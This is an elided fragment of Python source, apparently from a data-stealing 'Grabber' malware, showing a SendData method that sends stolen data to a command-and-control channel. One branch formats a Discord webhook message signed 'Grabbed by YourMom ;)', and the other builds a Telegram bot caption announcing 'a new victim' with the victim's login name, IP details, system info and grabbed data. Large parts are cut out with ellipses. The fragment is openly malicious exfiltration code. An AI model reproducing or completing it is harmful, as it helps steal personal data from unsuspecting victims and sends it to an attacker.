    ...
    def SendData(self) -> None: # Sends data to the webhook
        ...
        match Settings.C2[0]:
            case 0: # Discord Webhook
                image_url = "https://github.com/Nagisalpx/Grabber-env/blob/main/image.png?raw=true"
                    ...
                    "embeds": [
                        {
                            ...
                            "url": "https://de.pornhub.org",
                            "color": 34303,
                            "footer": {
                                "text": "Grabbed by YourMom ;)"
                            },
                            "thumbnail": {
                                "url": image_url
                            }
            ...
            case 1: # Telegram Bot
                payload = {
                    'caption': f'<b>Grabber</b> got a new victim: <b>{os.getlogin()}</b>\n\n<b>IP Info</b>\n<code>{ipinfo}</code>\n\n<b>System Info</b>\n<code>{system_info}</code>\n\n<b>Grabbed Info</b>\n<code>{grabbedInfo}</code>'.strip(), 
                    'parse_mode': 'HTML'
                }
